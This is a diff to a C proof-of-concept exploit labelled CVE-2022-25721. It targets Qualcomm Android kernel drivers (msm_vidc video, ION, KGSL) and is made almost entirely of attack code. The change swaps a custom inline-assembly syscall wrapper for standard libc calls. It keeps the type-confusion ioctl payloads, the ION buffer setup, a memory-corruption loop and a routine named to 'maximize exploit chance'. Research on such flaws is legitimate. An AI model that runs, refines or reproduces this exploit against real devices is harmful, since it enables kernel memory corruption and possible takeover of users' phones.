@@ -11,7 +11,7 @@
 #include <errno.h>
 #include <dlfcn.h>
 #include <poll.h>
-#include <sys/syscall.h>
+#include <sys/ucontext.h>
 
 #define LOG_TAG "cve-2022-25721-poc"
 
@@ -88,25 +88,6 @@ struct msm_vidc_type_confusion_payload {
 
 static volatile int trigger_status = 0;
 
-static long inline_syscall(long number, long arg0, long arg1, long arg2, long arg3, long arg4, long arg5) {
-    long ret;
-    register long x8 __asm__("x8") = number;
-    register long x0 __asm__("x0") = arg0;
-    register long x1 __asm__("x1") = arg1;
-    register long x2 __asm__("x2") = arg2;
-    register long x3 __asm__("x3") = arg3;
-    register long x4 __asm__("x4") = arg4;
-    register long x5 __asm__("x5") = arg5;
-    __asm__ volatile (
-        "svc #0"
-        : "=r"(x0)
-        : "r"(x8), "r"(x0), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5)
-        : "memory", "cc"
-    );
-    ret = x0;
-    return ret;
-}
-
 static void poc_signal_handler(int signal, siginfo_t *info, void *context) {
     if (signal == SIGSEGV) {
         trigger_status = 1;
@@ -114,8 +95,9 @@ static void poc_signal_handler(int signal, siginfo_t *info, void *context) {
         #ifdef __aarch64__
             ucontext_t *ucontext = (ucontext_t *)context;
             pc = (void *)ucontext->uc_mcontext.pc;
+            (void)pc;
         #endif
-        inline_syscall(__NR_exit, 1, 0, 0, 0, 0, 0);
+        _exit(1);
     }
 }
 
@@ -129,12 +111,12 @@ static int setup_poc_signal_handler(void) {
 }
 
 static int allocate_ion_buffer(size_t size, int *ion_fd, int *buffer_fd) {
-    int fd = inline_syscall(__NR_open, (long)"/dev/ion", O_RDWR, 0, 0, 0, 0);
+    int fd = open("/dev/ion", O_RDWR);
     if (fd < 0) {
-        fd = inline_syscall(__NR_open, (long)"/dev/ion", O_RDONLY, 0, 0, 0, 0);
+        fd = open("/dev/ion", O_RDONLY);
     }
     if (fd < 0) {
-        fd = inline_syscall(__NR_open, (long)"/dev/ion", O_RDWR, 0, 0, 0, 0);
+        fd = open("/dev/ion", O_RDWR);
         if (fd < 0) return -1;
     }
     struct ion_allocation_data alloc_data;
@@ -142,18 +124,18 @@ static int allocate_ion_buffer(size_t size, int *ion_fd, int *buffer_fd) {
     alloc_data.len = size;
     alloc_data.heap_id_mask = 0x1 << 1;
     alloc_data.flags = 0;
-    if (inline_syscall(__NR_ioctl, fd, ION_IOC_ALLOC, (long)&alloc_data, 0, 0, 0) < 0) {
+    if (ioctl(fd, ION_IOC_ALLOC, &alloc_data) < 0) {
         alloc_data.heap_id_mask = 0x1 << 4;
-        if (inline_syscall(__NR_ioctl, fd, ION_IOC_ALLOC, (long)&alloc_data, 0, 0, 0) < 0) {
-            inline_syscall(__NR_close, fd, 0, 0, 0, 0, 0);
+        if (ioctl(fd, ION_IOC_ALLOC, &alloc_data) < 0) {
+            close(fd);
             return -1;
         }
     }
     struct ion_fd_data share_data;
     memset(&share_data, 0, sizeof(share_data));
     share_data.handle = alloc_data.fd;
-    if (inline_syscall(__NR_ioctl, fd, ION_IOC_SHARE, (long)&share_data, 0, 0, 0) < 0) {
-        inline_syscall(__NR_close, fd, 0, 0, 0, 0, 0);
+    if (ioctl(fd, ION_IOC_SHARE, &share_data) < 0) {
+        close(fd);
         return -1;
     }
     *ion_fd = fd;
@@ -166,9 +148,9 @@ static void *map_buffer_to_userspace(int buffer_fd, size_t size) {
 }
 
 static int setup_confusion_payload(struct msm_vidc_poc_buffer *confusion) {
-    int video_fd = inline_syscall(__NR_open, (long)VIDEO_DEVICE_NODE, O_RDWR, 0, 0, 0, 0);
+    int video_fd = open(VIDEO_DEVICE_NODE, O_RDWR);
     if (video_fd < 0) {
-        video_fd = inline_syscall(__NR_open, (long)VIDEO_DEVICE_NODE, O_RDONLY, 0, 0, 0, 0);
+        video_fd = open(VIDEO_DEVICE_NODE, O_RDONLY);
         if (video_fd < 0) {
             return -1;
         }
@@ -179,8 +161,8 @@ static int setup_confusion_payload(struct msm_vidc_poc_buffer *confusion) {
     confusion->size = SYSTEM_PAGE_SIZE;
     confusion->ptr = (void *)0xdeadbeefcafebabe;
     confusion->flags = 0x1 | 0x2;
-    inline_syscall(__NR_ioctl, video_fd, MSM_VIDC_IOCTL_CMD, (long)confusion, 0, 0, 0);
-    inline_syscall(__NR_close, video_fd, 0, 0, 0, 0, 0);
+    ioctl(video_fd, MSM_VIDC_IOCTL_CMD, confusion);
+    close(video_fd);
     return 0;
 }
 
@@ -193,17 +175,17 @@ static int trigger_memory_corruption_arm64(void) {
     }
     void *ion_map = map_buffer_to_userspace(ion_buffer_fd, SYSTEM_PAGE_SIZE * 2);
     if (ion_map == MAP_FAILED) {
-        inline_syscall(__NR_close, ion_buffer_fd, 0, 0, 0, 0, 0);
-        inline_syscall(__NR_close, ion_fd, 0, 0, 0, 0, 0);
+        close(ion_buffer_fd);
+        close(ion_fd);
         return -1;
     }
     volatile unsigned long *corruption_target = (volatile unsigned long *)((unsigned long)ion_map + SYSTEM_PAGE_SIZE);
     *corruption_target = 0xcafebabeabad1dea;
-    confusion_video_fd = inline_syscall(__NR_open, (long)VIDEO_DEVICE_NODE, O_RDWR, 0, 0, 0, 0);
+    confusion_video_fd = open(VIDEO_DEVICE_NODE, O_RDWR);
     if (confusion_video_fd < 0) {
         munmap(ion_map, SYSTEM_PAGE_SIZE * 2);
-        inline_syscall(__NR_close, ion_buffer_fd, 0, 0, 0, 0, 0);
-        inline_syscall(__NR_close, ion_fd, 0, 0, 0, 0, 0);
+        close(ion_buffer_fd);
+        close(ion_fd);
         return -1;
     }
     struct kgsl_sharedmem_cmd kgsl_buffer;
@@ -216,7 +198,7 @@ static int trigger_memory_corruption_arm64(void) {
     kgsl_buffer.sequence_id = 0xdead;
     kgsl_buffer.offset = 0;
     kgsl_buffer.fd = ion_buffer_fd;
-    inline_syscall(__NR_ioctl, confusion_video_fd, KGSL_IOCTL_SHAREDMEM_FROM_FD, (long)&kgsl_buffer, 0, 0, 0);
+    ioctl(confusion_video_fd, KGSL_IOCTL_SHAREDMEM_FROM_FD, &kgsl_buffer);
     struct msm_vidc_poc_buffer confusion_payload;
     memset(&confusion_payload, 0, sizeof(confusion_payload));
     confusion_payload.cmd_type = 0x42;
@@ -226,7 +208,7 @@ static int trigger_memory_corruption_arm64(void) {
     confusion_payload.ptr = (void *)corruption_target;
     confusion_payload.flags = 0xdeadbeef;
     for (int attempt = 0; attempt < 0x10; attempt++) {
-        inline_syscall(__NR_ioctl, confusion_video_fd, MSM_VIDC_IOCTL_CMD, (long)&confusion_payload, 0, 0, 0);
+        ioctl(confusion_video_fd, MSM_VIDC_IOCTL_CMD, &confusion_payload);
         if (*corruption_target != 0xcafebabeabad1dea) {
             trigger_status = 1;
             break;
@@ -235,9 +217,9 @@ static int trigger_memory_corruption_arm64(void) {
         confusion_payload.ptr = (void *)((unsigned long)confusion_payload.ptr + 0x100);
     }
     munmap(ion_map, SYSTEM_PAGE_SIZE * 2);
-    inline_syscall(__NR_close, ion_buffer_fd, 0, 0, 0, 0, 0);
-    inline_syscall(__NR_close, confusion_video_fd, 0, 0, 0, 0, 0);
-    inline_syscall(__NR_close, ion_fd, 0, 0, 0, 0, 0);
+    close(ion_buffer_fd);
+    close(confusion_video_fd);
+    close(ion_fd);
     return 0;
 }
 
@@ -256,11 +238,11 @@ static void maximize_exploit_chance(void) {
     vidc_buffer.offset = 0;
     vidc_buffer.fd = -1;
     vidc_buffer.buffer = (unsigned long)payload_buffer;
-    int video_fd = inline_syscall(__NR_open, (long)VIDEO_DEVICE_NODE, O_RDWR, 0, 0, 0, 0);
+    int video_fd = open(VIDEO_DEVICE_NODE, O_RDWR);
     if (video_fd > 0) {
-        inline_syscall(__NR_ioctl, video_fd, 0xc0407801, (long)&vidc_buffer, 0, 0, 0);
-        inline_syscall(__NR_ioctl, video_fd, MSM_VIDC_IOCTL_CMD, (long)&vidc_buffer, 0, 0, 0);
-        inline_syscall(__NR_close, video_fd, 0, 0, 0, 0, 0);
+        ioctl(video_fd, 0xc0407801, &vidc_buffer);
+        ioctl(video_fd, MSM_VIDC_IOCTL_CMD, &vidc_buffer);
+        close(video_fd);
     }
 }
 
@@ -277,13 +259,13 @@ static void reset_system_state(void) {
 
 int main(void) {
     if (setup_poc_signal_handler() < 0) {
-        inline_syscall(__NR_exit, 1, 0, 0, 0, 0, 0);
+        _exit(1);
     }
     void *injected_data = mmap((void *)0x10000000, SYSTEM_PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
     if (injected_data == MAP_FAILED) {
         injected_data = mmap(NULL, SYSTEM_PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
         if (injected_data == MAP_FAILED) {
-            inline_syscall(__NR_exit, 1, 0, 0, 0, 0, 0);
+            _exit(1);
         }
     }
     volatile unsigned long *type_validation = (volatile unsigned long *)injected_data;
@@ -295,9 +277,9 @@ int main(void) {
     }
     reset_system_state();
     if (trigger_status) {
-        inline_syscall(__NR_exit, 0x7f, 0, 0, 0, 0, 0);
+        _exit(0x7f);
     } else {
-        inline_syscall(__NR_exit, 1, 0, 0, 0, 0, 0);
+        _exit(1);
     }
     return 0;
 }
